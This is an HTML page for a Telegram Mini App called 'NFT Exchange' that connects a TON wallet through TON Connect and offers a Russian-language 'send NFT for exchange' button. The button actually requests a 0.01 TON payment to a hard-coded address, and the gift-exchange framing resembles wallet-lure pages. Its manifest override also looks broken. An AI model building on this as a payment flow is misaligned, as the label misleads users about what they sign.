<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Exchange Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #182533;
            color: white;
            text-align: center;
            padding: 20px;
        }
        #ton-connect-btn {
            margin: 20px auto;
            display: block;
            min-height: 40px;
        }
        .btn-send {
            background-color: #2481cc;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            display: none;
        }
    </style>
</head>
<body>

    <h2>🔄 Обмен NFT Подарков</h2>
    <p>Подключите кошелек для автоматического подтверждения сделки</p>

    <div id="ton-connect-btn"></div>

    <br>
    <button id="send-nft-btn" class="btn-send">Отправить NFT на обмен</button>

    <script>
        // Инициализация Telegram Web App
        const tg = window.Telegram.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        // Передаем манифест напрямую объектом, а не ссылкой на файл
        const tonConnectUI = new TONConnectUI.TonConnectUI({
            manifestUrl: null, // Отключаем внешнюю ссылку
            buttonRootId: 'ton-connect-btn'
        });

        // Принудительно задаем данные нашего Mini App внутри скрипта
        tonConnectUI.connector.manifest = {
            url: "https://bannyslayser.github.io/my-nft-app/",
            name: "NFT Exchange",
            iconUrl: "https://ton.org/front/img/ton_logo.svg"
        };

        const sendBtn = document.getElementById('send-nft-btn');

        // Следим за статусом кошелька
        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                sendBtn.style.display = 'inline-block';
            } else {
                sendBtn.style.display = 'none';
            }
        });

        sendBtn.addEventListener('click', async () => {
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 60,
                messages: [
                    {
                        address: "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c",
                        amount: "10000000"
                    }
                ]
            };

            try {
                const result = await tonConnectUI.sendTransaction(transaction);
                alert("Успешно!");
                if (tg) tg.close();
            } catch (e) {
                alert("Ошибка транзакции.");
            }
        });
    </script>
</body>
</html>
